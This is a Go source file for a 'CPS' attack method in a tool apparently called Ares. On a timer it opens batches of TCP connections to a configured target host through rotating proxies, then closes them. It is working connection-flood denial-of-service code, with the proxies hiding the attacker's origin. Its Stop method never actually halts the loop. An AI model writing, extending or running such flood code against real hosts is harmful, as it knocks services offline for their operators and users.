package methods

import (
	"Ares/core"
	"net"
	"time"
)

type CPS struct {
	Config     *core.AttackConfig
	isRunning  bool
	connBuffer chan net.Conn
}

func (c *CPS) Start() {
	c.connBuffer = make(chan net.Conn, c.Config.PerDelay)
	c.isRunning = true
	done := make(chan struct{})
	c.loop(done)
}

func (c *CPS) loop(done chan struct{}) {
	ticker := time.NewTicker(c.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < c.Config.PerDelay; i++ {
				go c.connect()
			}
			go c.closeChannels()
		case <-done:
			return
		}
	}
}

func (c *CPS) connect() {
	conn, err := c.Config.ProxyManager.GetNext().Dial()(c.Config.Host)
	if err != nil {
		return
	}
	c.connBuffer <- conn
}

func (c *CPS) closeChannels() {
	for i := 0; i < cap(c.connBuffer); i++ {
		select {
		case conn := <-c.connBuffer:
			conn.Close()
		default:
			break
		}
	}
}

func (c *CPS) Stop() {
	c.isRunning = false
}
